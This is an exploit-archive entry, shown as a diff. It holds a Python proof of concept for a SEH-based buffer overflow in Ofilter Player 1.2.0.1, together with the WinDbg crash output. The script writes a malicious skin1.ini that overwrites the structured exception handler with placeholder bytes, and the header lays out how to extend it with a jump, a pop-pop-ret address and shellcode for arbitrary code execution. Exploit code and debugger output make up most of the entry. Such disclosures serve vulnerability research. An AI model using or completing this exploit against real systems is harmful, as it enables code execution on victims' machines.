@@ -1,0 +1,95 @@
+id: 21232
+date: 09/13/2013
+title: Ofilter Player 1.2.0.1 Buffer Overflow Vulnerability
+author: gunslinger
+cves: 
+
+# Exploit Title     : Ofilter Player Version 1.2.0.1 - (skin1.ini) - SEH Based Buffer Overflow PoC
+# Date              : 12-09-2013
+# Exploit Author    : gunslinger_ <yuda at cr0security.com>
+# Author Homepage   : http://www.cr0security.com
+# Software Link     : http://download.cnet.com/Ofilter-Player/3000-2139_4-78232.html
+# Price             : Free to try; $19.99 to buy
+# Version           : 1.2.0.1 (Probably old version of software and the LATEST version too)
+# Vendor            : DigitByte Studio
+# Vendor Homepage   : http://www.008soft.com/
+# Tested on         : Windows XP SP3
+#============================================================================================
+# Ofilter Player is Prone to a SEH based Buffer Overflow which allows attacker to execute arbitary code on the victim's machine.
+# To trigger the vulnerability the attacker must rewrite file skin1.ini inside /skin folder on Ofilter Player installed folder.
+# Then run Ofilter Player, and EIP will be overwritten with the SEH address when the program initialize to read variable from skin1.ini file (see debug result below).
+# The Exploit will look like this : [Junk "A" x 360] [6 Bytes Jump + 2Nops ] [pop pop ret address / others] [Shellcode] .
+# Crash Triggered + Seh Overwritten .
+#============================================================================================
+#!/usr/bin/python
+'''
+0:000> g
+ModLoad: 773d0000 774d3000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll
+ModLoad: 5ad70000 5ada8000   C:\WINDOWS\system32\uxtheme.dll
+(658.3f0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0000018c ebx=00000000 ecx=41414141 edx=0012df77 esi=00000171 edi=00000171
+eip=0040161d esp=0012ddc4 ebp=0012df08 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** WARNING: Unable to verify checksum for image00400000
+*** ERROR: Module load completed but symbols could not be loaded for image00400000
+image00400000+0x161d:
+0040161d 8b41f4          mov     eax,dword ptr [ecx-0Ch] ds:0023:41414135=????????
+0:000> g
+(658.3f0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=bbbbbbbb edx=7c9032bc esi=00000000 edi=00000000
+eip=bbbbbbbb esp=0012d9f4 ebp=0012da14 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+bbbbbbbb ??              ???
+0:000> !exchain
+0012da08: ntdll!ExecuteHandler2+3a (7c9032bc)
+0012df54: bbbbbbbb
+Invalid exception stack at cccccccc
+'''
+from struct import pack
+filename    = "skin1.ini"
+junk        = "\x41" * 360
+nextSEH     = "\xcc\xcc\xcc\xcc" 
+SEH         = "\xbb\xbb\xbb\xbb"
+
+trigger_seh = junk + nextSEH + SEH
+
+ini_content = """[BACKGROUND]
+Mask=GoldMask.bmp
+Main=GoldMain.bmp
+Selected=GoldSelected.bmp
+Over=GoldOver.bmp
+Disabled=GoldDisable.bmp
+
+[BUTTON]
+1=ID_FILE_EXIT,273,10,9,9,Exit,FALSE
+2=ID_BUTTON_MINIMIZE,261,10,9,9,MINIMIZE,FALSE
+3=IDC_BUTTON1_FILELIST_LOOP,229,85,42,21,FILE,FALSE
+4=ID_JUMP_FORWARD,103,91,16,15,Skip Forward,FALSE
+5=ID_PLAYBACK_NEXTCHAPTER,119,91,16,15,Next,FALSE
+6=ID_PLAYBACK_PREVIOUSCHAPTER,23,91,16,15,Previous,FALSE
+7=ID_PLAYBACK_STOP,86,91,17,15,Stop,FALSE
+8=ID_PLAYBACK_PAUSE,71,91,15,15,Pause,FALSE
+9=ID_PLAYBACK_PLAY,53,91,18,15,Play,FALSE
+10=ID_JUMP_BACKWARD,38,91,15,15,Skip Backward,FALSE
+11=ID_FILE_SELECTDISC,145,85,41,21,Open Media Files,FALSE
+12=ID_WEBSITE,117,8,69,16,Website,FALSE
+13=%s,186,85,42,21,Open VCD,FALSE
+14=ID_POPUP_HELP,251,10,9,9,Popup,FALSE
+
+[TRACKBARINFO]
+1=IDC_SLIDER1_PLAYBACK_POSITION,Goldbutton1.bmp,Goldbutton1.bmp,23,69,247,6,H,100
+2=IDC_SLIDER1_VOLUME,Goldbutton2.bmp,Goldbutton2.bmp,23,79,113,6,H,100
+
+[PLAY]
+1=ID_PLAYBACK_TIME,Arial,TRUE,TRUE,-14,32768,100,43,160,16,
+2=PLAY,Arial,TRUE,TRUE,-14,32768,34,43,50,16,10""" % (trigger_seh)
+
+textfile = open(filename , 'wb')
+textfile.write(ini_content)
+textfile.close()
+
+#  0day.today [2023-03-23]  #
